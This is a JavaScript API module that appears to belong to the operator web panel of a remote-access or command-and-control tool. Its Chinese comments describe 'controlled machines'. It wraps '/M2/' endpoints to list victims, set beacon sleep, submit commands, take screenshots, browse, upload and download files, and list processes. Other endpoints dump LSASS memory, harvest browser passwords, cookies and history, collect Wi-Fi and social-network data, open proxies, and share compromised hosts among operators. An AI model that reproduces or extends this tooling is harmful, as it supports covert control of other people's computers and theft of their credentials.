import request from '@/utils/request'

/**
 * @param {Object} data
 * 获取被控机器
 */
export function getClientList(data) {
  return request({
    url: '/M2/get_client_list_for_web?t=' + Math.round(new Date()),
    method: 'post',
    data
  })
}

/**
 * @param {Object} data
 * 设置延时
 */
export function setSleep(data) {
  return request({
    url: '/M2/set_sleep',
    method: 'post',
    data
  })
}

/**
 * @param {Object} data
 * 设置备注
 */
export function setNote(data) {
  return request({
    url: '/M2/set_note',
    method: 'post',
    data
  })
}

/**
 * @param {Object} data
 * 设置备注
 */
export function setAv(data) {
  return request({
    url: '/M2/set_av',
    method: 'post',
    data
  })
}

/**
 * @param {Object} data
 * 提交命令
 */
export function submitTask(data) {
  return request({
    url: '/M2/submit_task',
    method: 'post',
    data
  })
}

/**
 * @param {Object} data
 * 获取命令执行结果
 */
export function getTaskRes(data) {
  return request({
    url: '/M2/get_task_list_for_web?t=' + Math.round(new Date()),
    method: 'post',
    data
  })
}

/**
 * @param {Object} data
 * 修改结果状态
 */
export function updTaskResStatus(data) {
  return request({
    url: '/M2/upd_task_list_for_web',
    method: 'post',
    data
  })
}

/**
 * @param {Object} data
 * 获取截屏数据
 */
export function showScreenshotList(data) {
  return request({
    url: '/M2/show_screenshot_list?t=' + Math.round(new Date()),
    method: 'post',
    data
  })
}

/**
 * @param {Object} data
 * 遍历当前目录
 */
export function getCurpathAllfile(data) {
  return request({
    url: '/M2/get_curpath_allfile?t=' + Math.round(new Date()),
    method: 'post',
    data
  })
}

/**
 * @param {Object} data
 * 获取公共文件区文件列表
 */
export function getPublicFiles(data) {
  return request({
    url: '/M2/get_public_files?t=' + Math.round(new Date()),
    method: 'post',
    data
  })
}

/**
 * @param {Object} data
 * 上传到被控机器 发送上传指令
 */
export function upload(data) {
  return request({
    url: '/M2/upload',
    method: 'post',
    data
  })
}

/**
 * @param {Object} data
 * 获取上传记录和查看上传进度
 */
export function getUploadProgress(data) {
  return request({
    url: '/M2/get_upload_progress?t=' + Math.round(new Date()),
    method: 'post',
    data
  })
}

/**
 * @param {Object} data
 * 下载中转站 发送下载指令
 */
export function download(data) {
  return request({
    url: '/M2/download',
    method: 'post',
    data
  })
}

/**
 * @param {Object} data
 * 获取下载记录和查看下载进度
 */
export function getDownloadProgress(data) {
  return request({
    url: '/M2/get_download_progress?t=' + Math.round(new Date()),
    method: 'post',
    data
  })
}

/**
 * @param {Object} data
 * 发送进程列表指令
 */
export function getProcessList(data) {
  return request({
    url: '/M2/get_process_list?t=' + Math.round(new Date()),
    method: 'post',
    data
  })
}

/**
 * @param {Object} data
 * 发送进程列表指令
 */
export function getSNSInfo(data) {
  return request({
    url: '/M2/get_sns_info?t=' + Math.round(new Date()),
    method: 'post',
    data
  })
}

/**
 * @param {Object} data
 * 获取非当前用户的用户列表
 */
export function getShareUsers(data) {
  return request({
    url: '/M2/get_share_users?t=' + Math.round(new Date()),
    method: 'post',
    data
  })
}

/**
 * @param {Object} data
 * 分享验证 是否是直属机器 不是则不能再分享
 */
export function checkShareClient(data) {
  return request({
    url: '/M2/check_share_client',
    method: 'post',
    data
  })
}

/**
 * @param {Object} data
 * 设置分享
 */
export function setShare(data) {
  return request({
    url: '/M2/set_share',
    method: 'post',
    data
  })
}

/**
 * @param {Object} data
 * 取消分享
 */
export function cancelShare(data) {
  return request({
    url: '/M2/cancel_share',
    method: 'post',
    data
  })
}

/**
 * @param {Object} data
 * 获取浏览器表单密码和Cookies
 */
export function getBrowserLC(data) {
  return request({
    url: '/M2/get_browser_cl?t=' + Math.round(new Date()),
    method: 'post',
    data
  })
}

/**
 * @param {Object} data
 * 获取浏览器历史记录
 */
export function getBrowserHistory(data) {
  return request({
    url: '/M2/get_browser_history?t=' + Math.round(new Date()),
    method: 'post',
    data
  })
}

/**
 * @param {Object} data
 * 获取LSASS内存
 */
export function getLsass(data) {
  return request({
    url: '/M2/get_lsass?t=' + Math.round(new Date()),
    method: 'post',
    data
  })
}

/**
 * @param {Object} data
 * 开启网络代理
 */
export function addNetworkAgent(data) {
  return request({
    url: '/M2/add_network_agent',
    method: 'post',
    data
  })
}

/**
 * @param {Object} data
 * 获取网络代理
 */
export function getNetworkAgent(data) {
  return request({
    url: '/M2/get_network_agent?t=' + Math.round(new Date()),
    method: 'post',
    data
  })
}

/**
 * @param {Object} data
 * 获取WIFI信息
 */
export function getWifiInfo(data) {
  return request({
    url: '/M2/get_wifi_info?t=' + Math.round(new Date()),
    method: 'post',
    data
  })
}

/**
 * @param {Object} data
 * 根据 用户获取最近 10条上线记录
 */
export function getLatelyTen(data) {
  return request({
    url: '/M2/get_lately_ten?t=' + Math.round(new Date()),
    method: 'post',
    data
  })
}
